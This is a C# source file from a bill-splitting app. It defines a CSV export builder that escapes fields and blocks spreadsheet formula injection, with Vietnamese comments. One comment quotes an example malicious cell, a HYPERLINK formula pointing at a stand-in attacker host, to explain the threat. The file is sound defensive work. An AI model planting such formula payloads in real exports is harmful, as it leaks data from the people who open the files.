using System.Text;

namespace SplitBill.Application.Export;

/// <summary>Sinh CSV tối giản, escape đúng chuẩn RFC 4180 (dấu phẩy/ngoặc kép/xuống dòng).</summary>
public sealed class CsvBuilder
{
    private readonly StringBuilder _builder = new();

    public CsvBuilder AddRow(params object?[] fields)
    {
        _builder.AppendLine(string.Join(",", fields.Select(Escape)));
        return this;
    }

    public override string ToString() => _builder.ToString();

    // ⚠️ Bảo mật (phát hiện qua security-review 2026-09-07, CWE-1236 CSV/Formula Injection): các
    // trường xuất ra (Expense.Title, Expense.Note, GroupMember.DisplayName...) là dữ liệu người dùng
    // tự đặt, không giới hạn ký tự. Excel/LibreOffice/Google Sheets coi 1 ô bắt đầu bằng '=', '+', '-',
    // '@' (hoặc tab/CR) là công thức — một thành viên ác ý có thể đặt tên/tiêu đề dạng
    // `=HYPERLINK("http://attacker.example/...",...)` để khi người khác (thường là Owner) mở file CSV
    // xuất ra bằng Excel, công thức đó tự chạy (rò rỉ dữ liệu ô khác, hoặc DDE trên Excel cũ). Chặn
    // bằng cách thêm dấu nháy đơn (') trước ký tự nguy hiểm đầu tiên — Excel hiển thị nguyên văn thay
    // vì tính toán, đây là biện pháp giảm thiểu tiêu chuẩn cho lớp lỗ hổng này.
    //
    // CHỈ áp dụng cho field kiểu string (bao gồm null → chuỗi rỗng) — KHÔNG áp dụng cho field số
    // (TotalAmount, ExtraFeeAmount, Net...). Lý do: các cột số dư/tiền hoàn toàn do server tự format
    // từ `long`, không phải input người dùng gõ tự do — nếu áp cùng luật, một số dư âm hợp lệ như
    // -50000 sẽ bị biến thành chuỗi "'-50000" (mất khả năng tính tổng/so sánh trong Excel), phá hỏng
    // chính công dụng của việc xuất CSV số dư mà không hề tăng thêm an toàn (số này không phải text
    // người dùng gõ tự do nên không thể chứa công thức).
    private static readonly char[] FormulaTriggerChars = ['=', '+', '-', '@', '\t'];

    private static string Escape(object? field)
    {
        var text = field?.ToString() ?? string.Empty;
        var isFreeTextField = field is null or string;

        if (isFreeTextField && text.Length > 0 && FormulaTriggerChars.Contains(text[0]))
        {
            text = "'" + text;
        }

        if (text.Contains(',') || text.Contains('"') || text.Contains('\n') || text.Contains('\r'))
        {
            return $"\"{text.Replace("\"", "\"\"")}\"";
        }

        return text;
    }
}
